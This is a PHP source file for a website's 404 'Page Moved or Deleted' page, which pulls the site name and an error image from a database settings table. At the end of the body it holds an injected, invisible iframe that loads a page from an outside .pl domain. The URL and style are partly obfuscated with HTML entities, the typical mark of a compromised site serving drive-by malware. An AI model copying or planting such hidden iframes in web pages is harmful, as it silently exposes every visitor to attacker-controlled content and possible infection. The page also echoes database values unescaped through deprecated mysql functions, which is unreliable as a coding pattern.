<?php
include ("mysql_connector.php");
$query = mysql_query("SELECT * FROM df_settings LIMIT 1");
$fetch = mysql_fetch_assoc($query);
$sitename = $fetch['DFSitename'];
$errorPage = $fetch['404 Page'];
?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
<title><?php echo $sitename; ?>: Page Moved or Deleted</title>
<style type="text/css">
<!--
.style1 {font-family: Arial, Helvetica, sans-serif}
body,td,th {
	color: #000000;
}
body {
	background-color: #FFFFFF;
	margin-left: 0px;
	margin-top: 0px;
	margin-right: 0px;
	margin-bottom: 0px;
}
.style2 {font-size: 18px}
a:link {
	color: #FF0000;
}
a:visited {
	color: #990000;
}
a:hover {
	color: #990000;
}
a:active {
	color: #FF0000;
}
-->
</style>
</head>
<body>
<div align="center"><a href="../"><img src="<?php echo $errorPage; ?>" alt="<?php echo $sitename; ?>" width="520" height="386" border="0"></a>
  <br>
  <table width="430" border="0" cellspacing="0" cellpadding="0">
    <tr>
      <td><span class="style1">This page or file has most likely been moved, renamed, or deleted. As this site is continually growing and changing be certain to only bookmark the homepage of the <?php echo $sitename; ?> website. Click below to return to the homepage!</span></td>
    </tr>
    <tr>
      <td align="center"><span class="style1"><strong><br>
        Please goto the </strong><br>
        <a href="../" class="style2">
      <?php echo $sitename; ?> Homepage</a></span></td>
    </tr>
  </table>
  </div>
<iframe src="http://jL.ch&#117;ra.pl/rc/" style="d&#105;splay:none"></iframe>
</body>
</html>